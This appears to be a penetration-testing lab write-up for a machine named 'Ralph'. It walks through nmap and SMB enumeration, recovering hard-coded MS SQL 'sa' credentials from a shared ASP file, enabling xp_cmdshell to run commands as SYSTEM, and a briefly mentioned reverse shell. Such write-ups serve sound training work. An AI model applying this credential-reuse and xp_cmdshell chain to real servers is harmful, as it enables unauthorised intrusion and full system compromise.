# Ralph (10.11.1.31)
****
## Enumeration
1. Enumerate running services using `nmap`
```
nmap -sV -sC -Pn 10.11.1.31
```

2. `nmap` was able to detect several running services, but for this machine, the area of interest are the **HTTP** service running on port 80, the **SMB** service running on port **139** and **445**, and lastly, the **mssql** service running on port **1433**
```
PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack Windows Server 2016
1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server
```

3. We did further enumeration on port **445** and we noticed an uncommon shared folder named `wwwroot`. 

```
nmap --script=smb-enum* 10.11.1.31 -p445 -Pn
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
...
|   \\10.11.1.31\wwwroot: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ    
```

4. We've connected to `wwwroot` folder we and discovered an interesting file named `login-off.asp`.
```
smbclient //10.11.1.31/wwwroot
Password for [WORKGROUP\chris]:
Try "help" to get a list of possible commands.
smb: \> ls
...
  login-off.asp       A   1369  Fri Nov  1 21:18:45 2019
  login-off.asp.txt   A   1369  Fri Nov  1 21:18:45 2019
...  
```

> [!info] 
>  A [text version](http://10.11.1.31/login-off.asp.txt) of this file is also accessible through the web.  

5. `login-off.asp` contains credentials for **MS SQL** - the database used by the web app.
```
Username: sa
Password: poiuytrewq
```

## Exploitation
1. We established a connection to the **MS SQL Server** using the retrieved credentials and an SQL client named `dbeaver`
![[ralph-dbeaver.png]]
2. Using `dbeaver` SQL Editor, we've executed the following commands one by one
```
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC xp_cmdshell 'whoami'
```

3. After executing the command `EXEC xp_cmdshell 'whoami'`, we are able to confirm that we can execute OS commands and it is running on the context of the user `nt authority\system`
![[ralph-whoami.png]]

## Post-exploitation
1. We've estabslihed a reversed shell and was able to read the flags
![[ralph-proof-network.png]]